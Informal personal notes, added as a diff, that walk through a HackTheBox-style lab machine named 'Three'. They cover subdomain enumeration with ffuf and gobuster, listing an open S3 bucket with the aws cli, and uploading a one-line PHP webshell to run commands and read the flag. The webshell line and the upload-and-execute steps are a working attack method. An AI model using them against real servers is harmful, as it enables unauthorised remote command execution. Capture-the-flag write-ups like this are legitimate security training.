@@ -1,0 +1,46 @@
+Three
+|
+|
+-do a nmap scan first on the ip gievn
+|
+-visit the ip you will get a site
+|
+-there will be a contact email mail@thetoppers.htb
+-we need the domain i.e thetoppers.htb so add this to /etc/hosts liek "the target machine ip  thetoppers.htb"
+|
+|
+-enumerate subdomains using ffuf or wfuzz
+|
+-use ffuf liek ffuf -u http://FUZZ.machineip/ -w wordlist_path (use /usr/share/wordlists/dnsmap.txt) it has all 3 letter dns shid and thats all thats required for this machine
+|
+#####kinda useless
+-NOTE: use ffuf -u http://thetoppers.htb/ -w /usr/share/wordlists/subdomains/subdomains-top1million-5000.txt -H "Host:FUZZ.thetoppers.htb" instead it will giev better input
+####useless cause shid tells all subdmains are there tf?
+|
+-cloned all the wordlists from here: https://github.com/danielmiessler/SecLists
+-the ones in /usr/share/wordlists dont work
+|
+-use gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/subdomains/subdomains-top1million-5000.txt instead
+|
+|
+-refer aws cli documentation
+|
+-pein to work with aws cli
+use aws s3 ls --endpoint=http://s3.thetoppers.htb use both http and s3 in the link else it will giev you more pein
+NOTE:CONFIGURE s3.thetoppers.htb again with the machine ip in the /etc/hosts else it will be fking huge ass pein
+|
+|
+-remember wappaanalyzer ye that shid showed that this server used php right
+-use a script to get a shell liek this
+-echo '<?php system($_GET["cmd"]); ?>' > shell.php
+|
+-put the webshell into the s3 bucket
+-aws --endpoint="http://s3.thetoppers.htb" s3 ls "s3://thetoppers.htb/"
+|
+-execute the commands using thetoppers.htb/shell.php?cmd=< yer command here >
+-flag will be in ../flag.txt
+|
+
+
+
+
